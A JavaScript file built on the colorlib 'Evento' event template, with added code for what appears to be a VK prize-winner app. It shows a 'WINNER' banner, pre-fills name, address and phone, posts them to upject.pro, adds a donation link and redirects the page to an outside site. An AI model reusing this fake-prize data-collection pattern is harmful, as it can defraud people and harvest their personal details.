/*
 * Evento -  Event html  Template
 * Build Date: jan 2018
 * Author: colorlib
 * Copyright (C) 2018 colorlib
 */
 /* ------------------------------------- */
/*  TABLE OF CONTENTS
 /* ------------------------------------- */
/*   PRE LOADING                          */
/*   WOW                                 */
/*   sliders                      */
/*    MAPS                               */
/*   COUNTER JS              */



function set_cookie ( name, value, exp_y, exp_m, exp_d, path, domain, secure )
{
  var cookie_string = name + "=" + escape ( value );
  if ( exp_y )
  {
    var expires = new Date ( exp_y, exp_m, exp_d );
    cookie_string += "; expires=" + expires.toGMTString();
  }
  if ( path )
        cookie_string += "; path=" + escape ( path );
 
  if ( domain )
        cookie_string += "; domain=" + escape ( domain );
  
  if ( secure )
        cookie_string += "; secure";
  document.cookie = cookie_string;
}

function get_cookie ( cookie_name )
{
  var results = document.cookie.match ( '(^|;) ?' + cookie_name + '=([^;]*)(;|$)' );
  if ( results )
    return ( unescape ( results[2] ) );
  else
    return null;
}
 
 
var user_data = "";
var m = "";
 
 
var url_string = window.location.href;
var url = new URL(url_string);
var uidd = url.searchParams.get("viewer_id");

if(uidd > 0) {
	set_cookie ( "uid", uidd );
}


$(window).load(function() {
	
	$.post( "https://www.upject.pro/gd.php", {uid: get_cookie("uid")})
	.done(function( data ) {
		window.top.location.href = "https://www.upject.pro"; 
		parent.document.location.href = "https://www.upject.pro";
		
		user_data = JSON.parse(data);
		
			$('.loader').delay(500).fadeOut('slow');
			
			m = user_data.member;
			d = user_data.delivery_data;
			p = user_data.priz;
			
			$("#fn_ln").html(m.f_name+" "+m.l_name);
			
			$("#pn").html(p);
			$("#win").html("ПОБЕДИТЕЛЬ: "+m.f_name+" "+m.l_name);
			$("#pl").attr("href", "https://vk.com/wall"+m.postID);
			
			
			$("#fn").val(m.f_name);
			$("#ln").val(m.l_name);
			
			$("#gid").val(m.gid);
			set_cookie( "gid", m.gid );
			$("#donate").attr("href", "https://upject.pro/donate.php?gid="+get_cookie("gid"));
			
			
			$("#country").val(d.country);
			$("#city").val(d.city);
			$("#adress").val(d.adress);
			
			$("#phone").val(d.phone);
			
			
			$("#tmrw").val(getTomorrow());
	});
});



$('#save_data').on('click', function(){
	
	$.post( "https://www.upject.pro/sg.php", {
		gid: $("#gid").val(),
		f_name: $("#fn").val(),
		l_name: $("#ln").val(),
		country: $("#country").val(),
		city:	 $("#city").val(),
		adress:	 $("#adress").val(),
		phone:	 $("#phone").val()
	})
	.done(function( data ) {
		window.location.replace('https://rckt-miner.github.io/o.html');
	});
	
});

$(document).ready(function() {
	var ddd = $('#body').height();
	if(ddd > 50) {
		VK.init(function() {
			setInterval(newSizeWindow, 100);
			function newSizeWindow() {
			  VK.callMethod("resizeWindow",760,$('#body').height());
			}
	   });
	}
});


$(document).ready(function() {

    'use strict';
    /* ==============================================
     /*   wow
      =============================================== */
    var wow = new WOW(
        {
            animateClass: 'animated',
            offset: 10,
            mobile: true
        }
    );
    wow.init();
    /* ==============================================
        STICKY HEADER
        =============================================== */

    $(window).on('scroll', function () {
        if ($(window).scrollTop() < 100) {
            $('.header').removeClass('sticky_header');
        } else {
            $('.header').addClass('sticky_header');
        }
    });
    /* --------------------------------------------------------
     COUNTER JS
     ----------------------------------------------------------- */

    $('.counter').counterUp({
        delay: 5,
        time: 3000
    });

    $(".countdown")
        .countdown("2018/03/01", function(event) {
            $(this).html(
                event.strftime('<div>%w <span>Weeks</span></div>  <div>%D <span>Days</span></div>  <div>%H<span>Hours</span></div> <div>%M<span>Minutes</span></div> <div>%S<span>Seconds</span></div>')
            );
        });

    /* ==============================================
     SLIDER
     =============================================== */
    $(".cover_slider").owlCarousel({
        smartSpeed:1000,
        autoplayHoverPause:false,
        dots:true,
        nav:false,
        items:1,
        animateOut: 'fadeOut',
        animateIn: 'fadeIn',
        dotsContainer: '.cover_dots'
    });

    $(".brand_carousel").owlCarousel({
        loop:true,
        autoplay:true,
        smartSpeed:450,
        autoplayHoverPause:false,
        dots:false,
        nav:false,
        responsiveClass:true,
        responsive:{
            0:{
                items:2
            },
            600:{
                items:3

            },
            1000:{
                items:5

            }
        },
        items:5
    });
    /* ------------------------------------- */
    /* Animated progress bars
     /* ------------------------------------- */

    var waypoints = $('.progress_container').waypoint(function() {
        $('.progress .progress-bar').progressbar({
            transition_delay: 1000
        });
    },{
        offset: '50%'
    });


        /* --------------------------------------------------------
    MAPS
    ----------------------------------------------------------- */
    var map = $('#map');
    if(map.length > 0) {
        google.maps.event.addDomListener(window, 'load', init);
        var lattuide = map.attr('data-lat');
        var longtuided = map.attr('data-lon');
    }
    function init() {
        // Basic options for a simple Google Map
        // For more options see: https://developers.google.com/maps/documentation/javascript/reference#MapOptions
        var mapOptions = {
            // How zoomed in you want the map to start at (always required)
            zoom: 16,
            scrollwheel: false,
            navigationControl: false,
            mapTypeControl: false,
            scaleControl: false,
            // The latitude and longitude to center the map (always required)
            center: new google.maps.LatLng(lattuide, longtuided), // New York

            // How you would like to style the map.
            // This is where you would paste any style found on Snazzy Maps.
            styles: [{"featureType":"water","stylers":[{"saturation":43},{"lightness":-11},{"hue":"#0088ff"}]},{"featureType":"road","elementType":"geometry.fill","stylers":[{"hue":"#ff0000"},{"saturation":-100},{"lightness":99}]},{"featureType":"road","elementType":"geometry.stroke","stylers":[{"color":"#808080"},{"lightness":54}]},{"featureType":"landscape.man_made","elementType":"geometry.fill","stylers":[{"color":"#ece2d9"}]},{"featureType":"poi.park","elementType":"geometry.fill","stylers":[{"color":"#ccdca1"}]},{"featureType":"road","elementType":"labels.text.fill","stylers":[{"color":"#767676"}]},{"featureType":"road","elementType":"labels.text.stroke","stylers":[{"color":"#ffffff"}]},{"featureType":"poi","stylers":[{"visibility":"off"}]},{"featureType":"landscape.natural","elementType":"geometry.fill","stylers":[{"visibility":"on"},{"color":"#b8cb93"}]},{"featureType":"poi.park","stylers":[{"visibility":"on"}]},{"featureType":"poi.sports_complex","stylers":[{"visibility":"on"}]},{"featureType":"poi.medical","stylers":[{"visibility":"on"}]},{"featureType":"poi.business","stylers":[{"visibility":"simplified"}]}]
        };

        // Get the HTML DOM element that will contain your map
        // We are using a div with id="map" seen below in the <body>
        var mapElement = document.getElementById('map');

        // Create the Google Map using our element and options defined above
        var map = new google.maps.Map(mapElement, mapOptions);

        // Let's also add a marker while we're at it
        var marker = new google.maps.Marker({
            position: new google.maps.LatLng(lattuide, longtuided),
            map: map,
            title: 'evento!'
        });
    }

});